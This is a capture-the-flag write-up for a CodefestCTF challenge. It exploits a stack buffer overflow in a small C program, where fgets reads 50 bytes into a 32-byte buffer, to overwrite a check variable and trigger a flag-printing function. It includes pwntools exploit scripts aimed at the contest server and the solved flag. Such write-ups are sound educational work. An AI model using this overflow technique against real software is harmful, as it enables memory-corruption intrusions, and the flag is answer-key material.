# **Challenge Name**: Admin?

## Challenge Description

Can you become Admin?  

**Connection**: `nc codefest-ctf.iitbhu.tech 51429`  

---

## Challenge Overview
The goal is to exploit a **buffer overflow** vulnerability to overwrite a critical variable (`local_14`) on the stack. By changing its value from `1` to `0x23456723`, we trigger the `win()` function, which prints the flag.  

### Key Code Snippets
```c
undefined4 main(void) {
  char local_34 [32]; // Buffer of size 32
  int local_14;       // Variable to overwrite (initialized to 1)
  fgets(local_34, 0x32, _stdin); // Reads up to 50 bytes into a 32-byte buffer
  if (local_14 == 0x23456723) { // Target condition
    win(); // Prints the flag
  }
}

void win(void) {
  FILE *flag_file = fopen("/flag.txt", "r");
  fgets(flag_buffer, 100, flag_file);
  puts(flag_buffer); // Prints the flag
}
```

---

## Approach
### Step 1: Understand the Vulnerability
- The `fgets` function reads **50 bytes** (`0x32` in hex) into a **32-byte buffer** (`local_34`). This allows us to overflow the buffer and overwrite adjacent variables on the stack.  
- The variable `local_14` (initialized to `1`) is located right after the buffer. Overwriting it to `0x23456723` triggers `win()`.

### Step 2: Calculate the Payload Structure
1. **Buffer Overflow**: Fill the 32-byte buffer (`local_34`) with junk data (e.g., `A`s).  
2. **Overwrite `local_14`**: Append the 4-byte value `0x23456723` in **little-endian** format.  

**Payload Structure**:  
```
[32 bytes of junk] + [0x23456723 in little-endian]
```

### Step 3: Exploit with Python and pwntools
Use `pwntools` to craft the payload and interact with the remote service:  

```python
from pwn import *

# Set up the connection
p = remote('codefest-ctf.iitbhu.tech', 51429)

# Craft the payload
payload = b'A' * 32          # Fill the 32-byte buffer
payload += p32(0x23456723)   # Overwrite local_14 with 0x23456723 (little-endian)

# Send the payload
p.sendline(payload)

# Receive the flag
print(p.recvall().decode())
```

---

## Detailed Explanation
### Why Little-Endian?
- Computers store multi-byte values in **little-endian** format (least significant byte first).  
- Example: `0x23456723` in hex becomes `\x23\x67\x45\x23` in bytes.  

### How the Overflow Works
1. **Buffer Layout**:  
   - `local_34` (32 bytes): `[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]`  
   - `local_14` (4 bytes): `0x00000001` (original value)  

2. **Overflow Execution**:  
   - Sending 32 bytes fills `local_34`.  
   - The next 4 bytes overwrite `local_14` to `0x23456723`.  

3. **Condition Check**:  
   The program checks `if (local_14 == 0x23456723)`. If true, `win()` prints the flag.  

---

## Solution Script
```python
import struct
from pwn import *

# Connect to the remote service
target = remote('codefest-ctf.iitbhu.tech', 51429)
# Address where we want to overwrite the local_14 variable to trigger the win() function
target_value = struct.pack('<I', 0x23456723)  # Little-endian format of the value to overwrite local_14
# Payload to overflow the buffer (32 bytes + value to overwrite local_14)
payload = b"A" * 32  # Fill the buffer with 32 'A's
payload += target_value  # Overwrite local_14 with 0x23456723
# Send the payload
target.sendline(payload)
# Receive and print the response
response = target.recvall()
print(response.decode())
# Close the connection
target.close()
```
---

## Flag
`CodefestCTF{15_th15_pr1v1l3g3_3sc4l4710n_zqzNfqGp}`  

---